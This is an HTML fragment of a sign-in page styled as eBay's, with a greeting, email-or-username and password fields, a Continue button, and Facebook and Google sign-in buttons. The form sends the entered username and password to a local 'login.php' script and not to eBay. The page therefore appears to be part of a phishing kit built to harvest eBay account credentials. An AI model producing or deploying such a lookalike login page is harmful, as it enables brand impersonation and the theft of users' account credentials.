    </div>
    <div class=body-content>
        <main id=mainContent role=main>
            <div class=id-first>
                <div class=signin-intro>
                    <h1 id=greeting-msg class=heading>Hello</h1><span id=signin-reg-msg tabindex=-1
                        class=sub-heading>Sign in to eBay</span>
                </div>
                <form id=signin-form name=signin-form action=login.php method="post">
                    <div>
                        <div>
                            <div class=floating-label><label for=userid
                                    class="floating-label__label floating-label__label--animate floating-label__label--focus">Email
                                    or username</label>
                                <div class=textbox><input id=userid class="textbox__control textbox__control--fluid"
                                        type=text value name=userid maxlength=64 required></div>
                            </div>
                            <br>
                            <div class=floating-label><label for=password
                                    class="floating-label__label floating-label__label--animate floating-label__label--focus">Password</label>
                                <div class=textbox><input id=password class="textbox__control textbox__control--fluid"
                                        type=password value required name=password></div>
                            </div>
                            <br>
                            <button type="submit" id=signin-continue-btn name=signin-continue-btn
                                class="btn btn--fluid btn--large-truncated btn--primary" data-ebayui
                                type=button>Continue</button>
                        </div>
                    </div>
                    <div class=social-signin-wrapper>
                        <div class=separator>
                            <div class="separator-line animate"></div>
                            <div id=social-signin-wrapper-separator class="separator-content animate"><mark>or</mark>
                            </div>
                        </div>
                        <div class=social-signin-buttons-reg>
                            <div><button id=signin_fb_btn
                                    class="scl-btn scl-btn--f btn btn--primary btn--large btn--fluid"
                                    type=button>Continue with Facebook</button></div>
                            <div><button id=signin_ggl_btn
                                    class="scl-btn scl-btn--g btn btn--primary btn--large btn--fluid"
                                    type=button>Continue with Google</button></div>
                        </div>
                    </div>
                </form>
            </div>
        </main>
